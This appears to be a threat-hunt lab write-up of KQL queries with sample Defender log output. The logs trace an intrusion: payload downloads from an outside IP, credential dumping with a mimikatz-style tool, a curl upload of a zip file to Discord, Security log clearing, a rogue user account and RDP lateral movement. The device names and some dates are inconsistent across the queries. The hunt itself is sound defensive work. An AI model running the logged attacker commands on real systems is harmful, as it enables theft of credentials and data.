
# Queries Used


This document contains all KQL queries used during the threat hunt incident, along with sample outputs for each flag.  

---


### Query
```kusto
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))

Timestamp: Nov 19, 2025 7:00:26 AM
DeviceId: 21f4f65e08bfe4cb12259e93e074a1ba3ab5fb83
DeviceName: azuki-logks
ActionType: LogonSuccess
LogonType: Network
AccountName: kenji.sato
RemoteDeviceName: kali
RemoteIP: 88.97.178.12
Protocol: NTLM

DeviceLogonEvents
| where DeviceName contains "azuki"
| where ActionType == "LogonSuccess"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| project AccountName, RemoteIP, RemoteDeviceName

AccountName: kenji.sato
RemoteIP: 88.97.178.12
RemoteDeviceName: kali

DeviceProcessEvents
| where DeviceName == "azuki-logks"
| where Timestamp >= datetime(2025-11-19 07:00:26)
| where ProcessCommandLine has_any ("arp", "ipconfig", "ifconfig", "net view", "nbtstat", "ping", "tracert", "route print", "netstat")
| project Timestamp, AccountName, FileName, ProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp asc

Timestamp: Nov 19, 2025 7:02:43 AM
AccountName: kenji.sato
FileName: ARP.EXE
ProcessCommandLine: "ARP.EXE" -a
InitiatingProcessParentFileName: explorer.exe

DeviceProcessEvents
| where DeviceName == "azuki-logks"
| where Timestamp >= datetime(2025-11-19 07:00:26)
| where ProcessCommandLine has_any ("mkdir", "md", "New-Item", "attrib")
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc

Timestamp: Nov 19, 2025 7:13:40 AM
FileName: attrib.exe
ProcessCommandLine: "attrib.exe" +h +s C:\ProgramData\WindowsCache

DeviceRegistryEvents
| where DeviceName == "azuki-logks"
| where Timestamp >= datetime(2025-11-19 07:00:26)
| where RegistryKey contains @"Windows Defender\Exclusions"
| project Timestamp, RegistryKey, RegistryValueName, RegistryValueData, ActionType
| order by Timestamp asc

Timestamp: Nov 19, 2025 7:17:17 AM
RegistryKey: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
RegistryValueName: C:\ProgramData\WindowsCache
ActionType: RegistryValueSet

Timestamp: Nov 19, 2025 7:17:24 AM
RegistryKey: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes
RegistryValueName: svchost.exe
ActionType: RegistryValueSet

DeviceRegistryEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RegistryKey contains @"Windows Defender\Exclusions\Paths"
| project Timestamp, RegistryKey, RegistryValueName, RegistryValueData, ActionType
| order by Timestamp asc

Timestamp: Nov 19, 2025 10:49:27 AM
RegistryKey: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
RegistryValueName: C:\Users\KENJI~1.SAT\AppData\Local\Temp
ActionType: RegistryValueSet


DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has_any ("http", "https", "://", "download", "urlcache", "iwr", "invoke-webrequest", "curl", "wget")
| project Timestamp, FileName, ProcessCommandLine, AccountName
| order by Timestamp asc


Timestamp: Nov 18, 2025 5:29:33 PM
FileName: certutil.exe
ProcessCommandLine: "certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeARM.exe C:\ProgramData\Adobe\Updates\AdobeARM.exe
AccountName: kenji.sato


DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FileName =~ "schtasks.exe"
| where ProcessCommandLine has "/create"
| project Timestamp, FileName, ProcessCommandLine, AccountName
| order by Timestamp asc


Timestamp: Nov 19, 2025 5:10:09 AM
FileName: schtasks.exe
ProcessCommandLine: "schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc onlogon /ru SYSTEM /f
AccountName: kenji.sato


Timestamp: Nov 19, 2025 7:23:23 AM
FileName: schtasks.exe
ProcessCommandLine: "schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc onlogon

DeviceNetworkEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where InitiatingProcessCommandLine contains @"C:\ProgramData\WindowsCache\svchost.exe"
| project Timestamp, RemoteIP, RemoteUrl, InitiatingProcessCommandLine
| order by Timestamp asc


Timestamp: Nov 19, 2025 11:09:21 AM
RemoteUrl: discord.com
RemoteIP: 162.159.135.232
InitiatingProcessCommandLine: "curl.exe" -F file=@C:\ProgramData\WindowsCache\export-data.zip http

DeviceNetworkEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RemoteIP == "78.141.196.6"
| where InitiatingProcessFileName endswith ".exe"
| project Timestamp, RemoteIP, RemotePort, InitiatingProcessCommandLine, DeviceName
| order by Timestamp asc

Timestamp: Nov 18, 2025 5:30:31 PM
RemoteIP: 78.141.196.6
RemotePort: 443
InitiatingProcessCommandLine: AdobeARM.exe
DeviceName: azuki-logistics


DeviceFileEvents
| where FolderPath startswith "C:\\ProgramData\\WindowsCache"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FileName endswith ".exe"
| project Timestamp, FileName, FolderPath, ActionType
| order by Timestamp asc

Timestamp: Nov 19, 2025 5:15:50 AM
FileName: mm.exe
FolderPath: C:\ProgramData\WindowsCache\mm.exe
ActionType: FileCreated


DeviceProcessEvents
| where ProcessCommandLine contains "mm.exe"
| project Timestamp, FileName, ProcessCommandLine

Timestamp: Nov 19, 2025 11:08:26 AM
FileName: mm.exe
ProcessCommandLine: "mm.exe" privilege::debug sekurlsa::logonpasswords exit

DeviceFileEvents
| where FolderPath startswith "C:\\ProgramData\\WindowsCache"
| where FileName endswith ".zip"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| project Timestamp, FileName, FolderPath, ActionType, InitiatingProcessCommandLine, DeviceName
| order by Timestamp asc

Timestamp: Nov 19, 2025 9:19:19 AM
FileName: export-data.zip
FolderPath: C:\ProgramData\WindowsCache\export-data.zip
ActionType: FileCreated
InitiatingProcessCommandLine: powershell.exe
DeviceName: azuki-kslog


DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FileName == "wevtutil.exe"
| where ProcessCommandLine contains "cl"
| project Timestamp, ProcessCommandLine, AccountName, DeviceName
| order by Timestamp asc


Timestamp: Nov 19, 2025 11:11:39 AM
ProcessCommandLine: "wevtutil.exe" cl Security
AccountName: kenji.sato
DeviceName: azuki-sl

DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FileName in~ ("net.exe", "net1.exe")
| where ProcessCommandLine has_any (" /add", "/add ")
| project Timestamp, ProcessCommandLine, AccountName, DeviceName
| order by Timestamp asc

Timestamp: Nov 19, 2025 11:09:48 AM
ProcessCommandLine: net1 user support ********** /add
AccountName: kenji.sato
DeviceName: azuki-sl


DeviceFileEvents
| where DeviceName contains "azuki"
| where Timestamp between (datetime(2025-11-18) .. datetime(2025-11-20))
| where FileName matches regex @"\.(ps1|psm1|bat|cmd)$"
| where FileName !startswith "__PSScriptPolicyTest"
| where FolderPath contains "Temp" or FolderPath contains "ProgramData"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
| order by Timestamp asc

Timestamp: Nov 19, 2025 10:49:48 AM
DeviceName: azuki-sl
FileName: wupdate.ps1
FolderPath: C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1
InitiatingProcessCommandLine: powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://78.141.196.6:8080/wupdate.ps1' -OutFile 'C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1' -UseBasicParsing"


DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp between (datetime(2025-11-18) .. datetime(2025-11-20))
| where ProcessCommandLine contains "cmdkey"
| extend TargetIP = extract(@"(\d{1,3}\.){3}\d{1,3}", 0, ProcessCommandLine)
| project Timestamp, DeviceName, TargetIP, ProcessCommandLine

Timestamp: Nov 19, 2025 11:10:37 AM
DeviceName: azuki-sl
TargetIP: 10.1.0.188
ProcessCommandLine: "cmdkey.exe" /generic:10.1.0.188 /user:fileadmin /pass:**********

DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp between (datetime(2025-11-18) .. datetime(2025-11-20))
| where ProcessCommandLine contains "mstsc"
        or ProcessCommandLine contains ".rdp"
        or FileName == "mstsc.exe"
| project Timestamp, DeviceName, FileName, ProcessCommandLine
| order by Timestamp asc

Timestamp: Nov 19, 2025 11:12:00 AM
DeviceName: azuki-sl
FileName: mstsc.exe
ProcessCommandLine: mstsc.exe /v:10.1.0.188


